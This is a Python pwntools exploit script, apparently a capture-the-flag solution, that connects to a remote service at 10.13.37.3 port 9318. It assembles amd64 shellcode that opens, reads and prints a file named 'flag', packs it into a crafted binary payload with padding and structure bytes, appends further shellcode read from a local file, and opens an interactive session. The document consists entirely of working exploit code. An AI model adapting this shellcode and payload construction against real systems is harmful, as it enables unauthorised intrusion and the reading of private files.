from pwn import *

r = remote("10.13.37.3",9318)

context.arch = "amd64"

payload = asm("""
mov rbx,0x067616c66
push rbx
mov rdi,rsp
mov rsi,0
mov rax,0x2
syscall
mov rdi,rax
mov rsi,rsp
mov rdx,0x100
mov rax,0x0
syscall
mov rdx,rax
mov rdi,1
mov rax,1
syscall
""")

payload="\x52\x0a\x01\x53\xe3\x94\x2c\x00"+payload
payload=payload.ljust(77,"\x00")
payload+="000010d94000402b000200000000000000010d98000402d000200000000000000010d9c000402f000200000000000000010da00004031000200000000000000010da40004033000200000000000000010da80004035000200000000000000010dac0004037000200000000000000010db00004039000200000000000000010db4000403b000200000000000000010db8000403d000200000000000000010dbc000403f000200000000000000010dc00004041000200000000000000010dc400040430002000000000000".decode("hex")


payload=payload.ljust(1356,"\x00")

payload+=("\xf4\xff\x00\x06\x00\x00\01\x03"+
"\xf4\xff\x00\x06\x00\x00\03\x03"+
"\xf4\xff\x00\x04\x00\x00\06\x01"+
"\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00"+
"\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x0d")

payload=payload.ljust(1536,"\x00")

payload+="flag\x00\x00\x00\x00"

payload = payload.ljust(0x80c,'\x00')
payload += open("shellcode").read()

r.send(payload.ljust(4096,"\x00"))

r.interactive()